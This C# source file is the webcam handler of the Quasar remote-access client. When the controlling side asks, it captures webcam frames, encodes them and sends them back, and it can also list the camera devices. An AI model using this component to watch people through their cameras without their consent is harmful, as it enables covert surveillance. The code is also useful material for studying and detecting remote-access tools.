using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Collections;
using Quasar.Client.Helper;
using System.Diagnostics;
using System.Collections.Generic;

namespace Quasar.Client.Messages
{
    public class WebcamHandler : NotificationMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;

        private WebcamHelper _webcamHelper = new WebcamHelper();

        public override bool CanExecute(IMessage message) => message is GetWebcam ||
                                                             message is GetWebcamDevices;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetWebcam msg:
                    Execute(sender, msg);
                    break;
                case GetWebcamDevices msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetWebcam message)
        {
            if(message.Destroy)
            {
                _webcamHelper.StopRunningVideo();
                OnReport("Remote webcam session stopped");
                return;
            }

            _webcamHelper.Init(message.DisplayIndex);

            var resolution = new Resolution { Height = _webcamHelper._resolution.Height, Width = _webcamHelper._resolution.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _webcamHelper.NewVideoSource(message.DisplayIndex);
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                OnReport("Remote webcam session started");
            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();
                _webcamHelper.NewVideoSource(message.DisplayIndex);
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            if(_webcamHelper._currentFrame == null)
            {
                Bitmap emptyFrame = new Bitmap(1920, 1080, PixelFormat.Format32bppPArgb);
                SendFrame(client, emptyFrame, resolution);
            }
            else
            {
                Bitmap webcamFrame = new Bitmap(_webcamHelper._currentFrame);
                SendFrame(client, webcamFrame, resolution);
            }
        }

        private void SendFrame(ISender client, Bitmap imageData, Resolution resolution)
        {
            BitmapData webcamData = null;
            Bitmap webcam = null;
            try
            {
                webcam = imageData;
                webcamData = webcam.LockBits(new Rectangle(0, 0, resolution.Width, resolution.Height),
                    ImageLockMode.ReadWrite, PixelFormat.Format32bppPArgb);
                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(webcamData.Scan0,
                        new Rectangle(0, 0, resolution.Width, resolution.Height),
                        new Size(resolution.Width, resolution.Height),
                        PixelFormat.Format32bppPArgb, stream);
                    client.Send(new GetWebcamResponse
                    {
                        Image = stream.ToArray(),
                        Quality = _streamCodec.ImageQuality,
                        Webcam = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution
                    });
                }
            }
            catch (Exception)
            {
                if (_streamCodec != null)
                {
                    client.Send(new GetWebcamResponse
                    {
                        Image = null,
                        Quality = _streamCodec.ImageQuality,
                        Webcam = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution
                    });
                }

                _streamCodec = null;
            }
            finally
            {
                if (webcam != null)
                {
                    if (webcamData != null)
                    {
                        try
                        {
                            webcam.UnlockBits(webcamData);
                        }
                        catch(Exception ex)
                        {
                            Debug.WriteLine(ex.Message);
                        }
                    }
                    webcam.Dispose();
                }
            }
        }

        private void Execute(ISender client, GetWebcamDevices message)
        {
            ArrayList webcamDevices = _webcamHelper.GetDevices();
            var deviceList = new List<Tuple<int, string>>();
            for (int i = 0; i < webcamDevices.Count; i++)
            {
                deviceList.Add(Tuple.Create(i, webcamDevices[i].ToString()));
            }
            client.Send(new GetWebcamDevicesResponse {WebcamDevices = deviceList });
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _streamCodec?.Dispose();
            }
        }
    }
}
